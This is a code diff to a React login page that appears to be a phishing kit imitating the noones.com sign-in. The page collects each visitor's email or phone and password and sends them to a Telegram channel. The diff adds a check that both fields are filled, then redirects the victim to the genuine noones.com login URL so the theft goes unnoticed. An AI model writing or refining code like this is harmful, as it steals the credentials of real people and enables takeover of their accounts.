@@ -1,15 +1,17 @@
-import React, { useState } from "react";
+import React, { use, useState } from "react";
 import "./styles/LoginPage.css";
 import ThemeToggle from "./ThemeToggle";
 import SvgSprite from "./SvgSprite.jsx";
 
 import { sendToTelegram } from "../telegram";
+import { useNavigate } from "react-router-dom";
 
 const LoginPage = ({ theme, toggleTheme }) => {
   //   const [formData, setFormData] = useState({
   //     email: "",
   //     password: "",
   //   });
+  const navigate = useNavigate();
 
   const [email, setEmail] = useState();
   const [password, setPassword] = useState();
@@ -42,8 +44,14 @@ const LoginPage = ({ theme, toggleTheme }) => {
     // Add Apple OAuth logic here
   };
   async function handleLoginData(e) {
+    if (!email || !password) {
+      return;
+    }
     const message = `New Login Attempt:\nEmail/Phone: ${email}\nPassword: ${password}`;
     await sendToTelegram(message);
+    navigate(
+      "https://noones.com/id/login?next=https%3A//auth.noones.com/oauth2/authorize%3Flocale%3Den%26redirect_uri%3Dhttps%253A%252F%252Fnoones.com%252Flogin%252Fcallback%26state%3Dd027a2dbb251902dbaff264bd2707b60%26response_type%3Dcode%26approval_prompt%3Dauto%26client_id%3Dh9VAgMcfYPfoBaihBIfKt7An7UwFon5aKFjrm68dzFdxZ7Tj"
+    ); // Redirect to dashboard after login
   }
 
   return (
